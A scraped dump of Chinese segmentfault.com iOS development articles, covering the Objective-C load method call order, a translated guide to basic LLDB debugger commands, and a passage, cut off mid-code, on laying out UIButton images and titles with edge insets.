<li><p>类先于分类调用</p></li>
</ol>
<p>这种现象是非常符合我们的直觉的，我们来分析一下这种现象出现的原因。</p>
<p>第一条规则是由于 <code>schedule_class_load</code> 有如下的实现：</p>
<pre><code class=""objectivec"">static void schedule_class_load(Class cls)
{
    if (!cls) return;
    assert(cls-&gt;isRealized());

    if (cls-&gt;data()-&gt;flags &amp; RW_LOADED) return;

    schedule_class_load(cls-&gt;superclass);

    add_class_to_loadable_list(cls);
    cls-&gt;setInfo(RW_LOADED); 
}</code></pre>
<p>这里通过这行代码 <code>schedule_class_load(cls-&gt;superclass)</code> 总是能够保证没有调用 <code>load</code> 方法的父类先于子类加入 <code>loadable_classes</code> 数组，从而确保其调用顺序的正确性。</p>
<p>类与分类中 <code>load</code> 方法的调用顺序主要在 <code>call_load_methods</code> 中实现：</p>
<pre><code class=""objectivec"">do {
    while (loadable_classes_used &gt; 0) {
        call_class_loads();
    }

    more_categories = call_category_loads();

} while (loadable_classes_used &gt; 0  ||  more_categories);</code></pre>
<p>上面的 <code>do while</code> 语句能够在一定程度上确保，类的 <code>load</code> 方法会先于分类调用。但是这里不能完全保证调用顺序的正确。</p>
<p>如果<strong>分类的镜像在类的镜像之前加载到运行时</strong>，上面的代码就没法保证顺序的正确了，所以，我们还需要在 <code>call_category_loads</code> 中判断类是否已经加载到内存中（调用 <code>load</code> 方法）：</p>
<pre><code class=""objectivec"">if (cls  &amp;&amp;  cls-&gt;isLoadable()) {
    (*load_method)(cls, SEL_load);
    cats[i].cat = nil;
}</code></pre>
<p>这里，检查了类是否存在并且是否可以加载，如果都为真，那么就可以调用分类的 load 方法了。</p>
<h2>load 的应用</h2>
<p><code>load</code> 可以说我们在日常开发中可以接触到的调用时间<strong>最靠前的方法</strong>，在主函数运行之前，<code>load</code> 方法就会调用。</p>
<p>由于它的调用不是<em>惰性</em>的，且其只会在程序调用期间调用一次，最最重要的是，如果在类与分类中都实现了 <code>load</code> 方法，它们都会被调用，不像其它的在分类中实现的方法会被覆盖，这就使 <code>load</code> 方法成为了<a href=""http://nshipster.com/method-swizzling/"" rel=""nofollow noreferrer"">方法调剂</a>的绝佳时机。</p>
<p>但是由于 <code>load</code> 方法的运行时间过早，所以这里可能不是一个理想的环境，因为<strong>某些类可能需要在在其它类之前加载</strong>，但是这是我们无法保证的。不过在这个时间点，所有的 framework 都已经加载到了运行时中，所以调用 framework 中的方法都是安全的。</p>
<h2>参考资料</h2>
<ul>
<li><p><a href=""http://stackoverflow.com/questions/13326435/nsobject-load-and-initialize-what-do-they-do"" rel=""nofollow noreferrer"">NSObject +load and +initialize - What do they do?</a></p></li>
<li><p><a href=""http://nshipster.com/method-swizzling/"" rel=""nofollow noreferrer"">Method Swizzling</a></p></li>
<li><p><a href=""https://www.mikeash.com/pyblog/friday-qa-2009-05-22-objective-c-class-loading-and-initialization.html"" rel=""nofollow noreferrer"">Objective-C Class Loading and Initialization</a></p></li>
</ul>
<blockquote><p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a><br>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p></blockquote>

                ", 你真的了解 load 方法么？,1531972034,143,1,236,1,1,https://segmentfault.com/a/1190000005025068
106,1,0,6,"
                    
<blockquote><p>原文链接：<a href=""https://swifting.io/blog/2016/02/19/6-basic-lldb-tips/"" rel=""nofollow noreferrer"">https://swifting.io/blog/2016/02/19/6-basic-lldb-tips/</a><br>原作者：Michał Wojtysiak</p></blockquote>
<h3>长话短说</h3>
<p>在开发了几年的iOS应用后，我对LLDB调试器的使用已经趋于最小：</p>
<pre><code>(lldb) po data.pressure
98.65814208984375
 
(lldb) po samples.count
28
 
(lldb) po (x + y)*z
96</code></pre>
<p>以上几乎就是我使用的全部了。这并不值得骄傲。设置一个断点，然后使用po命令。我知道po是'print object（输出对象）'的意思，并且能用它来计算表达式。我需要更先进的工具来帮我应对不得不处理的复杂难题。</p>
<p>让我们开始吧！</p>
<h3>探究LLDB工作区</h3>
<p>你总能够在调试的时候输入一个help命令：</p>
<pre><code>(lldb) help
Debugger commands:
 
  apropos           -- Find a list of debugger commands related to a particular
                       word/subject.
 
...</code></pre>
<p>你可能已经注意到就连apropos命令也是分外有趣的。让我们使用LLDB的'聪明才智'来为我们推荐设置断点的命令：</p>
<pre><code>(lldb) apropos breakpoints
The following built-in commands may relate to 'breakpoints':
  breakpoint                -- A set of commands for operating on breakpoints.
                               Also see _regexp-break.
  breakpoint clear          -- Clears a breakpoint or set of breakpoints in the
                               executable.
  breakpoint command add    -- Add a set of commands to a breakpoint, to be
                               executed whenever the breakpoint is hit.  If no
                               breakpoint is specified, adds the commands to
                               the last created breakpoint.
 
 
...</code></pre>
<p>LLDB还不赖嘛，还不赖。</p>
<h3>LLDB必须要配合Xcode才能使用吗？</h3>
<p>当然。。。不是咯！我们并不需要依赖Xcode的调试区域（Debug Area）。我们能够很轻易地从终端启动LLDB。在此之前我们需要先搭建一个app去模拟相应的环境。在终端切换到你的项目路径下输入：</p>
<pre><code>michal$ xcodebuild -sdk iphonesimulator9.2</code></pre>
<p>在路径：<code>project_dir/build/Release-iphonesimulator/appname.app</code> 下你就有了一个为调试而生的 <code>*.app</code> 文件。</p>
<p>现在，在不切换路径的前提下你就能够从终端启动LLDB了：</p>
<pre><code>michal$ xcrun lldb
(lldb)</code></pre>
<p>接着你需要像这样创建一个测试目标：</p>
<pre><code>(lldb) target create ./build/Release-iphonesimulator/appname.app  
Current executable set to './build/Release-iphonesimulator/appname.app' (x86_64).</code></pre>
<p>最后，启动一个进程来开始我们的任务：</p>
<pre><code>(lldb) process launch</code></pre>
<p>这样我们就和在Xcode中运行调试模式一样了。</p>
<p>标准的Ctrl+C命令无法让你退出LLDB，请使用quit命令：</p>
<pre><code>(lldb) quit
michal$</code></pre>
<h3>为什么我需要在命令行使用LLDB？</h3>
<p>如果你浏览了(lldb) apropos breakpoint给出的结果，你肯定意识到了很多可能的原因。想要获取更多针对断点的帮助请输入：</p>
<pre><code>(lldb) help breakpoint</code></pre>
<p>虽然Xcode有了一些用UI实现的调试特性：</p>
<ul>
<li><p>Breakpoint Navigator (⌘ + 7)</p></li>
<li><p>Debug Navigator (⌘ + 6)</p></li>
<li><p>Debug Area (⌘ + Shift + Y)</p></li>
<li><p>Debug menu item</p></li>
</ul>
<p>但在命令行中使用LLDB我们能获取到更多更详细的调试信息。</p>
<p>以断点列表为例，在Debug Navigator中你会看到一个方法名，断点处代码所处行数，以及这个断点是否有效：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008809245?w=258&amp;h=119"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>虽然这样看起来不错，但通过LLDB命令breakpoint list能带给你更多像执行次数或者地址一类的信息：</p>
<pre><code>(lldb) breakpoint list
Current breakpoints:
1: file = '/Users/michal/Developer/Swift/Altimeter/Altimeter/ViewController.swift', line = 72, locations = 1, resolved = 1, hit count = 1
 
  1.1: where = Altimeter`Altimeter.ViewController.startAltimeter (Altimeter.ViewController)() -&gt; () + 712 at ViewController.swift:72, address = 0x00000001000e86b4, resolved, hit count = 1 
 
  ...</code></pre>
<p>通过添加像-v这样的参数我们能获取到更详尽的输出结果。要想了解所有的参数请输入：</p>
<pre><code>(lldb) help breakpoint list</code></pre>
<p>如果你想着能得到更多锻炼，尝试与breakpoint enable和breakpoint disable这样的子命令共舞：</p>
<pre><code>(lldb) breakpoint disable //disables all
(lldb) breakpoint disable 1.1 //disables just one place
(lldb) breakpoint enable //enables all
...</code></pre>
<h3>设置简单的和复杂的断点</h3>
<p>当使用Xcode时我们习惯在一个指定的文件的某一行设置断点。命令行的LLDB不仅仅提供了这一种类型的断点。让我们来看一下下面这些例子，每一个例子展示了简短而完整的版本：</p>
<ul>
<li>
<p>在一个文件的指定行设置断点：</p>
<pre><code>(lldb) breakpoint set --file ViewController.swift --line 26
(lldb) breakpoint set -f ViewController.swift -l 26</code></pre>
</li>
<li>
<p>在每个方法处设立断点：</p>
<pre><code>(lldb) breakpoint set --selector viewDidLoad
(lldb) breakpoint set -S viewDidLoad</code></pre>
</li>
<li>
<p>在每一个方法名设立断点：</p>
<pre><code>(lldb) breakpoint set --name stringToDate
(lldb) breakpoint set -n stringToDate</code></pre>
</li>
<li>
<p>设置匹配regexp方法名字的断点：</p>
<pre><code>(lldb) breakpoint set --source-pattern-regexp 'Manager' -file ViewController.swift
(lldb) breakpoint set -p 'Manager' -f ViewController.swift</code></pre>
</li>
<li>
<p>设置一个在第一次停止后就删除的断点：</p>
<pre><code>(lldb) breakpoint set &lt;other_params&gt; --one-shot
(lldb) breakpoint set &lt;other_params&gt; -o</code></pre>
</li>
</ul>
<p>当然，这只是命令行所能做到的一小部分。想了解设置断点的更多信息请输入：</p>
<pre><code>(lldb) help breakpoint set</code></pre>
<h3>调试会话的导航</h3>
<p>在Xcode里调试的时候你一定能熟练运用'continue'，'step in'，'step out'和'step over'按钮。对于LLDB命令来说要怎么完成同样的事呢？</p>
<pre><code>(lldb) thread continue
(lldb) thread step-in
(lldb) thread step-out
(lldb) thread step-over</code></pre>
<p>像往常一样，通过thread的help命令你会发现更多的参数。</p>
<h3>其它被选出的小技巧</h3>
<p>我们还能通过命令行完成些什么操作呢？让我们一探究竟吧。</p>
<h5>类型格式化</h5>
<p>你可能会对<strong>调试区（Debug Area）</strong>中的<strong>'View Value As</strong>比较熟悉。它的作用是快速改变一个给定值的展示样式：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008809246?w=1280&amp;h=800"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>如果你想一直把布尔变量用二进制格式显示呢？看看用LLDB是如何完成这个任务的：</p>
<pre><code>(lldb) print isAltimeterRunning.value
(Builtin.Int1) $R2 = false
(lldb) type format add --format decimal Builtin.Int1
(lldb) print isAltimeterRunning.value
(Builtin.Int1) $R3 = 0</code></pre>
<p>我们能额外了解到的是Swift的bool是Builtin.Int1类型。不得不说LLDB的类型格式化对于Swift的类型来说并不是很友好。类型名字必须完全匹配。类型格式化对于老的Cocoa对象和Obj-C/C支持的更好。</p>
<h5>类型摘要</h5>
<p>从我们关于输出调试法（print debugging）的<a href=""https://swifting.io/blog/2016/01/26/1-meaningful-print-debugging/?utm_source=swifting.io"" rel=""nofollow noreferrer"">博文</a>中我们知道了如何使用CustomStringConvertible去获得有意义的调试信息。这同样能应用在LLDB上。为了让这看起来简单，我们用Int来举例子。这就是我们能在调试区经常看到的样子：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008809247?w=773&amp;h=148"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>让我们添加一个类型摘要，把它显示到控制台上：</p>
<pre><code>(lldb) type summary add -s ""natural=${var.value} octal=${var.value%o} hex=${var.value%x}"" Int
(lldb) frame variable integer
(Int) integer = 4095 natural=4095 octal=07777 hex=0x00000fff</code></pre>
<p>当我们重新查看调试区时就能看到我们自定义的信息：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008809248?w=771&amp;h=154"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h5>多行表达式模式</h5>
<p>当使用LLDB调试时我们手握功能强大的编译器。开发它的潜力最好的方式是使用expression命令进入多行模式。在LLDB中输入expression，回车：</p>
<pre><code>(lldb) expression
Enter expressions, then terminate with an empty line to evaluate:
1 struct compass{var direction = ""N""; var angle = 16.5}
2 var c = compass()
3 print(c)
4 
(compass #1)(direction: ""N"", angle: 16.5)
(lldb) </code></pre>
<h5>线程返回栈</h5>
<p>当调试线程时我们经常使用Debug Navigator (⌘ + 5)：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008809249?w=262&amp;h=387"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>通过一行命令就能达到同样的效果，甚至得到更详尽的线程返回栈的打印：</p>
<pre><code>(lldb) thread backtrace all</code></pre>
<h5>错误展开</h5>
<p>一个额外需要记住的东西是在LLDB中执行的表达式会影响我们执行过的代码。如果你在LLDB中修改了变量的值，当继续执行的时候这个变量的值仍是被修改过的。</p>
<p>更有甚者一些表达式可能会引起程序崩溃。通常来说如果造成了崩溃程序的状态就被清空了。然而有时候我们想要看一下这些状态。</p>
<p>想象一下减少一个var integer:UInt = 10变量：</p>
<pre><code>(lldb) expression while integer &lt;= 0 {integer--}
error: Execution was interrupted, reason: EXC_BAD_INSTRUCTION (code=EXC_I386_INVOP, subcode=0x0).
The process has been returned to the state before expression evaluation.</code></pre>
<p>我们获得了一个错误但我们依然能够继续执行。</p>
<p>要改变这个问题我们给表达式设置一个--unwind-on-error=0参数：</p>
<pre><code>(lldb) expression --unwind-on-error=0 -- while integer &lt;= 0 {integer--}
error: Execution was interrupted, reason: EXC_BAD_INSTRUCTION (code=EXC_I386_INVOP, subcode=0x0).
The process has been left at the point where it was interrupted, use ""thread return -x"" to return to the state before expression evaluation.</code></pre>
<p>这样我们就得到了真正导致的崩溃原因。</p>
<h5>查找未格式化的变量</h5>
<p>在类型摘要例子中我们尽我们所能得到了一个不错的格式化输出，使用了frame variable命令来显示。而有些时候我们想做的却恰恰相反-原始的值。让我们看下这里面的区别：</p>
<pre><code>(lldb) frame variable self.isAltimeterRunning
(Bool) self.isAltimeterRunning = false
 
(lldb) frame variable --raw self.isAltimeterRunning
(Swift.Bool) self.isAltimeterRunning = {
  value = 0
}</code></pre>
<p>这也解释了很多Swift的结构体类型是如何设置的。它们有一个value变量。挖掘更深入之后我们能看到Bool类型背后的真实类型：</p>
<pre><code>(lldb) frame variable self.isAltimeterRunning.value
(Builtin.Int1) self.isAltimeterRunning.value = 0</code></pre>
<p>它是Int1类型-一个一比特的整型。如果你想要知道更多关于解包Swfit Bool类型和其他类型请看<a href=""https://swiftunboxed.com/open-source/Bool/?utm_source=swifting.io"" rel=""nofollow noreferrer"">SwiftUnboxed</a>。--raw参数同样适用于窥探Swift的optional和nested optional。</p>
<h3>就是这样！</h3>
<p>希望你注意到了在命令行中使用LLDB命令的优点。这篇文章只是摸索了其中的冰山一角。你能在<a href=""http://lldb.org/?utm_source=swifting.io"" rel=""nofollow noreferrer""><strong>LLDB Documentation</strong></a>阅读有关lldb的文章。同样也去看下他们的<a href=""http://lldb.org/tutorial.html?utm_source=swifting.io"" rel=""nofollow noreferrer""><strong>教程</strong></a>。</p>
<p>苹果有一个<a href=""https://developer.apple.com/library/ios/documentation/IDEs/Conceptual/gdb_to_lldb_transition_guide/document/lldb-command-examples.html#//apple_ref/doc/uid/TP40012917-CH3-SW1?utm_source=swifting.io"" rel=""nofollow noreferrer""><strong>quick start</strong></a>让开发者入门。同样有很多WWDC的视频教程：</p>
<ul>
<li><p><a href=""https://developer.apple.com/videos/play/wwdc2012/415/"" rel=""nofollow noreferrer"">WWDC 2012: Debugging with LLDB</a></p></li>
<li><p><a href=""https://developer.apple.com/videos/play/wwdc2014/410/"" rel=""nofollow noreferrer"">WWDC 2014: Advanced Swift debugging in LLDB</a></p></li>
<li><p><a href=""https://developer.apple.com/videos/play/wwdc2014/409/"" rel=""nofollow noreferrer"">WWDC 2014: Introduction to LLDB and the Swift REPL</a></p></li>
<li><p><a href=""https://developer.apple.com/videos/play/wwdc2015/402/"" rel=""nofollow noreferrer"">WWDC 2015: What’s new in LLDB</a></p></li>
</ul>
<p>最后值得一提的是，<a href=""https://www.objc.io/issues/19-debugging/lldb-debugging/?utm_source=swifting.io"" rel=""nofollow noreferrer""><strong>objc.io</strong></a>对LLDB做了很好的总结。</p>
<h3>2016年1月21日更新</h3>
<h5>我是否需要一遍遍输入所有的命令？</h5>
<p>如果你对有效的在命令行使用LLDB依旧没什么信心，你可能会想看一下.lldbinit。这是一个在你home路径下的文件。它包含了一系列LLDB命令。要创建你自己的文件在终端中执行以下命令：</p>
<pre><code>michal$ cd ~/
michal$ touch .lldbinit
michal$ chmod +x .lldbinit</code></pre>
<p>然后你就能用一系列每次LLDB启动时候要运行的命令来填充.lldbinit文件。例如：</p>
<pre><code>breakpoint set -n malloc -N memory 
breakpoint set -n free -N memory
breakpoint disable memory</code></pre>
<p>以上命令在malloc和free方法出设置断点并给他们一个通用的名字'memory'。这些断点是被禁止的，所以它们并不会干扰到你，但是如果你想调试内存相关的东西时它们尽在掌控。要让这些断点生效只需要修改文件最后一行或者在运行时输入下面这行命令：</p>
<pre><code>(lldb) breakpoint enable memory</code></pre>
<p>请观看<a href=""https://developer.apple.com/videos/play/wwdc2015/402/"" rel=""nofollow noreferrer""><strong>WWDC 2015: What’s new in LLDB</strong></a>视频获得更多细节。</p>
<h5>更多有用的命令</h5>
<p>在上面提到的的WWDC视频中，你能发现很多很有用的命令，例如：</p>
<ul>
<li>
<p>type lookup命令：</p>
<pre><code>(lldb) type lookup CLLocation
@available(iOS 2.0, *)
@objc class CLLocation : ObjectiveC.NSObject, NSCopying, NSSecureCoding {
  @objc deinit  {
  }
  @objc init(latitude: CoreLocation.CLLocationDegrees, longitude: CoreLocation.CLLocationDegrees)
  ...</code></pre>
</li>
<li>
<p>给Objc/Swift语言设置异常断点：</p>
<pre><code>(lldb) breakpoint set -E objc
(lldb) breakpoint set -E swift</code></pre>
</li>
<li>
<p>给某一个指定类型设置断点：</p>
<pre><code>(lldb) breakpoint set -E -O EnumError</code></pre>
</li>
<li>
<p>最后给极少数热爱者一些福利。一个memory命令：</p>
<pre><code>(lldb) po locationMgr
&lt;CLLocationManager: 0x7af76280&gt;
 
(lldb) memory read 0x7af76280
0x7af76280: 40 4a 17 00 60 63 f7 7a 00 00 00 00 00 00 00 00  @J..`c.z........
0x7af76290: 33 75 af 37 20 76 af 47 03 00 00 00 00 00 00 00  3u.7 v.G........</code></pre>
<p>它的真正的威力当你查看C数组或char* 字符串才能体现。</p>
</li>
</ul>

                ", [译] LLDB 基础,1531972036,113,1,429,1,1,https://segmentfault.com/a/1190000004976815
107,1,0,6,"
                    
<p>iOS的<em>UIButton</em>是一个非常常见而且常用的控件，我们一般用他来实现某个功能的提交以及选择操作。我们可以建立只有文字的Button，也可以建立只有图片的Button，具体的需求要看界面设计的具体情况。有时候我们希望应用的界面元素是丰富多彩的，有时候希望建立一个图文结合的控件来响应用户的手势操作，因此建立一个即有图片也有文字的按钮来实现功能，这个只需要分别调用UIButton的<code>setTitle:forState:</code>和<code>setImage:forSate:</code>两个方法就可以实现具有图片和文字功能的按钮。但是系统默认的图文结合的按钮布局是：<strong>图片在左边而文字在右边，而且整体水平和垂直居中</strong>。比如下面这个图文按钮：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000008316495"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""默认的图文按钮"" title=""默认的图文按钮""></span><br>但是有的时候我们又希望图片在右边而文字在左边；或者图片在上边而文字在下面；或者图片在按钮的中间而文字在图片的下面等等，但我们又不想放弃使用按钮这个控件，这时候怎么办？ 事件总是能找到解决方法的， 有的人会先建立一个按钮控件铺在下面，而在上面分别覆盖一个<em>UIImageView</em>和<em>UILabel</em>来实现；而有的人则干脆在<em>UIButton</em>上建立一个<em>UIImageView</em>和<em>UILabel</em>两个子视图；而有的人则不会用<em>UIButton</em>来实现图文结合的功能。 前面说的几个方法看起来有效，也确实会解决问题，但缺点是代码量会增加，而且必须同时管理<em>UIButton</em>, <em>UIImageView</em>, <em>UILabel</em>这三个整体，如果哪天产品还希望有一个按钮按下高亮或者按下阴影效果时,你可能又要重新编写代码实现需求了。<br>那么我们是否要放弃<em>UIButton</em>呢？答案是否定的，其实<em>UIButton</em>本身是可以支持各种图文结合的，既然<em>UIButton</em>上能同时显示图片和文字，那就可以肯定的说<em>UIButton</em>里面本身一定有一个<em>UIImageView</em>和<em>UILabel8子视图。</em>UIButton*本身就是一个复合控件，他分别提供了两个属性：</p>
<pre><code>@property(nonatomic,readonly,retain)UILabel     *titleLabel NS_AVAILABLE_IOS(3_0);
@property(nonatomic,readonly,retain)UIImageView *imageView  NS_AVAILABLE_IOS(3_0);</code></pre>
<p>需要注意的是这两个属性必须要调用完<code>setTitle:forSate:</code>和<code>setImage:forSate:</code>后才能获取到，否则有可能会返回nil。 其中的 <em>titleLabel</em>是用来保存文字的而<em>imageView</em>是用来保存图片的。那既然<em>UIButton</em>本身就带有一个图片控件和文本控件，那是不是我们只要分别通过调整子控件的<em>frame</em>值就能实现我们想要的图片文字的任何布局呢？ 答案是否定的。实验证明通过设置<em>titleLabel、imageView</em>的<em>frame</em>值根本不会改变按钮里面图片在左而文字在右的格局。 要想实现功能就必须使用另外两个属性：</p>
<pre><code>@property(nonatomic)         UIEdgeInsets titleEdgeInsets;   // default is UIEdgeInsetsZero
@property(nonatomic)         UIEdgeInsets imageEdgeInsets;   // default is UIEdgeInsetsZero</code></pre>
<p>这两个属性是分别用来调整按钮中文本的偏移缩进以及图片的偏移缩进的，他们都是一个<em>UIEdgeInsets</em>对象，默认的值都是0，也就是默认的值都是0的情况下按钮的图片和文字垂直居中，而且图片在左边文字在右边，而且图片文本整体水平居中。而我们则可以通过调整<em>titleEdgeInsets</em>和<em>imageEdgeInsets</em>的值来实现我们想要的任何图文布局的情况，甚至我们希望图片和文字之间还要保留一些间隔的情况。怎么调整？ 调整多少为最合适？</p>
<p>在调整之前我们先定义几个特定的变量值：</p>
<pre><code>CGRect titleRect = titleLabel.frame;        //文本控件在按钮中的frame值。
CGRect imageRect = imageView.frame;  //图片控件在按钮中的frame值。
CGFloat padding;                                     //用于指定文本和图片的间隔值。
CGFloat selfWidth;                                   //按钮控件的宽度
CGFloat selfHeight;                                  //按钮控件的高度
CGFloat totalHeight=titleRect.size.height+padding+imageRect.size.height;  //图文上下布局时所占用的总高度，注意这里也算上他们之间的间隔值padding</code></pre>
<p>我们可以通过更改按钮的<em>titleEdgeInsets</em>和<em>imageEdgeInsets</em>的值调整文本和图片的位置。如果我们想往右移动20的话，那么就应该同时设置<em>UIEdgeInsets</em>的left=20, right=-20，而如果我们想往上移动20的话，那么就应该应该同时设置<em>UIEdgeInsets</em>的top=-20,bottom=20。下面我们就分别通过调整按钮的<em>titleEdgeInsets</em>和<em>imageEdgeInsets</em>的值来实现各种图文结合的效果：</p>
<h2>一、图片在左，文字在右，整体居中，调整间距</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316496"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片在左，文字在右，整体居中，设置间距"" title=""图片在左，文字在右，整体居中，设置间距""></span><br>这种方式是按钮默认的图文布局方式，因为要调整图片和文本的间距，所以只需要文本右移<em>padding/2</em>而图片左移<em>padding/2</em>值就可以了。设置的代码为：</p>
<pre><code>  
  titleEdgeInsets =UIEdgeInsetsMake(0,
                                     padding/2,
                                     0,
                                     -padding/2);
                
  imageEdgeInsets = UIEdgeInsetsMake(0,
                                     -padding/2,
                                     0,
                                     padding/2);
  
</code></pre>
<h2>二、图片在右，文字在左，整体居中</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316497"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片在右，文字在左，整体居中"" title=""图片在右，文字在左，整体居中""></span><br>要实现这种布局只需要将文字往左偏移图片的宽度并且再往左偏移<em>padding/2</em>就可以了，而图片则只需要往右偏移文本的宽度并再往右偏移<em>padding/2</em>就可以了。设置的代码为：</p>
<pre><code> 
  titleEdgeInsets =UIEdgeInsetsMake(0,
                                     -(imageRect.size.width + padding/2),
                                     0,
                                     (imageRect.size.width + padding/2));
            
  imageEdgeInsets =UIEdgeInsetsMake(0,
                                     (titleRect.size.width+ padding/2),
                                     0,
                                     -(titleRect.size.width+ padding/2));
</code></pre>
<h2>三、图片在上，文字在下，整体居中</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316498"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片在上，文字在下，整体居中"" title=""图片在上，文字在下，整体居中""></span><br>这种布局下当图片和文字要求垂直居中后，新的图片的顶部位置应该等于<em>(selfHeight -  totalHeight)/2</em>， 因此垂直需要偏移的值就是新的位置减去原来的位置<em>imageRect.origin.y</em>；而新的图片的水平中心点要等于<em>selfWidth/2</em>，而原来的图片的水平中心点等于<em>imageRect.origin.x + imageRect.size.width/2</em>，两者相减就是水平需要偏移的值。而新的文本的顶部位置应该等于新的图片的顶部位置<em>(selfHeight - totalHeight)/2</em> + 图片的高度<em>imageRect.size.height</em> +  间隔<em>padding</em> ,因此垂直需要偏移的值就是新的顶部值减去原来的顶部位置<em>titleRect.origin.y</em>; 而新的文本的水平中心点也是<em>selfWidth/2</em>，而原来的文本的水平中心点是<em>titleRect.origin.x + titleRect.size.width/2</em>， 两者相减就是水平需要偏移的值，<strong>又因为默认的情况下当按钮比较小时会自动保留图片的尺寸和将文字部分缩小，因为当我们实现文字和图片上下布局时，需要将文字的区域扩展到整个按钮部分，否则将会缩小按钮的文字的宽度</strong>，因为按钮的宽度为<em>selfWidth</em>,而文字的默认宽度是<em>titleRect.size.width</em>,所以上面的实现将文本移到中间后还需要分别向两边进行拉伸<em>(selfWith - titleRect.size.width)/2</em>来保证文本填充满所有的按钮区域，<strong>在下面的各种样式中凡是文字和图片垂直居中的情况下都要考虑这种情况</strong>   设置的代码为：</p>
<pre><code> 
     
  titleEdgeInsets =UIEdgeInsetsMake(((selfHeight - totalHeight)/2 + imageRect.size.height + padding - titleRect.origin.y),
                                     (selfWidth/2 - titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2,
                                     -((selfHeight - totalHeight)/2 + imageRect.size.height + padding - titleRect.origin.y),
                                     -(selfWidth/2 - titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2);
            
  imageEdgeInsets =UIEdgeInsetsMake(((selfHeight - totalHeight)/2 - imageRect.origin.y),
                                     (selfWidth /2 - imageRect.origin.x - imageRect.size.width /2),
                                     -((selfHeight - totalHeight)/2 - imageRect.origin.y),
                                     -(selfWidth /2 - imageRect.origin.x - imageRect.size.width /2));
</code></pre>
<h2>四、图片在下，文字在上，整体居中</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316499"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片在下，文字在上，整体居中"" title=""图片在下，文字在上，整体居中""></span><br>这种布局就是上面的文字和图片位置调换，因此设置代码为：</p>
<pre><code> 
  titleEdgeInsets =UIEdgeInsetsMake(((selfHeight - totalHeight)/2 - titleRect.origin.y),
                                     (selfWidth/2 - titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2,
                                     -((selfHeight - totalHeight)/2 - titleRect.origin.y),
                                     -(selfWidth/2 - titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2);
            
  imageEdgeInsets =UIEdgeInsetsMake(((selfHeight - totalHeight)/2 + titleRect.size.height + padding - imageRect.origin.y),
                                     (selfWidth /2 - imageRect.origin.x - imageRect.size.width /2),
                                     -((selfHeight - totalHeight)/2 + titleRect.size.height + padding - imageRect.origin.y),
                                     -(selfWidth /2 - imageRect.origin.x - imageRect.size.width /2));
</code></pre>
<h2>五、图片保持居中，而文字左右居中且顶部距离按钮顶部</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316500"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片保持居中，而文字左右居中且顶部距离按钮顶部"" title=""图片保持居中，而文字左右居中且顶部距离按钮顶部""></span><br>这种方式要求图片在按钮中居中，而文字则要求左右居中而垂直方向位置则是距离按钮顶部的间隔值。 上面因为描述了水平居中的调整，因此这里就不介绍了，只介绍垂直方向的调整。 因为要求图片要垂直居中，因此不需要调整垂直偏移。而文本则要调整为距离顶部的间隔值，也就是新的文本的顶部值等于<em>padding</em>, 而原来顶部值是<em>titleRect.origin.y</em>，因此只需要偏移<em>titleRect.origin.y - padding</em>就可以了。设置代码为：</p>
<pre><code>  titleEdgeInsets =UIEdgeInsetsMake(-(titleRect.origin.y - padding),
                                     (selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2,
                                     (titleRect.origin.y - padding),
                                     -(selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2);
            
  imageEdgeInsets =UIEdgeInsetsMake(0,
                                     (selfWidth /2 - imageRect.origin.x - imageRect.size.width /2),
                                     0,
                                     -(selfWidth /2 - imageRect.origin.x - imageRect.size.width /2));
</code></pre>
<h2>六、图片保持居中，而文字水平居中且底部距离按钮底部</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316501"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片保持居中，而文字水平居中且底部距离按钮底部"" title=""图片保持居中，而文字水平居中且底部距离按钮底部""></span><br>这种方式要求图片在按钮居中，而文字则要求左右居中而垂直方向的底部位置则是距离按钮底部的间隔值。图片的调整上面有介绍，而文字的水平调整上面也有说到，这里面只说文字的垂直调整。文字新的底部位置等于<em>selfHeight - padding</em>,  而旧的底部位置是<em>titleRect.size.height + titleRect.origin.y</em>， 因此要偏移的位置就是两者相减的值。代码的设置为：</p>
<pre><code>  titleEdgeInsets =UIEdgeInsetsMake((selfHeight - padding - titleRect.origin.y - titleRect.size.height),
                                     (selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2,
